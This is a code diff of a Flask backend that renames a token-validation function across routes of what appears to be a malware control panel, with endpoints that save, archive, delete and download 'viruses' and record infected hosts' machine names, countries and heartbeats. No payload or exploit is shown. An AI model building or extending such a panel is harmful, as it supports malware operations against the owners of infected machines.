@@ -44,7 +44,7 @@ def dbConnect():
     curs = conn.cursor()
 
 
-def validateToken():
+def validate_token():
     sessionToken = session['token']
     print(f"session[token] = {sessionToken}")
     print(f"current_user.token = {current_user.token}")
@@ -352,7 +352,7 @@ def save_virus():
     print("Save virus called")
     try:
         # Validates token against session and on DB
-        if validateToken():
+        if validate_token():
             # Get form data
             name = request.form.get('name') 
             heartbeat_rate = request.form.get('heartbeat_rate') 
@@ -490,7 +490,7 @@ def save_host():
     host_notes = data['host_notes']
     settings = data['settings']
     last_heartbeat = data['last_heartbeat']
-    if validateToken():
+    if validate_token():
         try:
             dbConnect()
             curs.execute("INSERT INTO Hosts (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat) VALUES (?, ?, ?, ?, ?, ?, ?)", (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat))
@@ -519,7 +519,7 @@ def save_host():
 # def getActiveVirus():
 #     print("getactivevirus")
 #     try:
-#         if validateToken():
+#         if validate_token():
 #             dbConnect()
 #             print("Trying to get virus table data")
 
@@ -543,7 +543,7 @@ def save_host():
 # def getVirus():
 #     try:
 #         # Validates session token against DB token
-#         if validateToken():
+#         if validate_token():
 #             dbConnect()
 #             print("Trying to get virus table data")
 
@@ -569,7 +569,7 @@ def get_hosts():
         # print(f"current_user.token = {current_user.token}")
         
         # Calls helper function to validate session token to db token
-        if validateToken():
+        if validate_token():
             dbConnect()
             print("Trying to get Hosts table data")
             curs.execute("SELECT * FROM Hosts WHERE user_id = ?", (str(current_user.id)))
@@ -594,7 +594,7 @@ def archive_virus():
     print("archiveVirus called")
     try:
         # Validates session token against DB token
-        if validateToken():
+        if validate_token():
             virus_id = request.form.get("virus_id")
             # Retrieve the virus from the database
             virus = Virus.query.get(virus_id)
@@ -642,7 +642,7 @@ def delete_virus():
     print("deleteVirus called")
     try:
         # Validates session token against DB token
-        if validateToken():
+        if validate_token():
             # Retrieve the virus from the database
             
             virus_id = request.form.get("virus_id")
@@ -823,7 +823,7 @@ def virus_download():
 @api.route('/internalvirusdownload', methods=['POST'])
 def internal_virus_download():
     try:
-        if validateToken():
+        if validate_token():
             # Retrieve the virus ID from the form
             virus_id = request.form.get('virus_id')
 
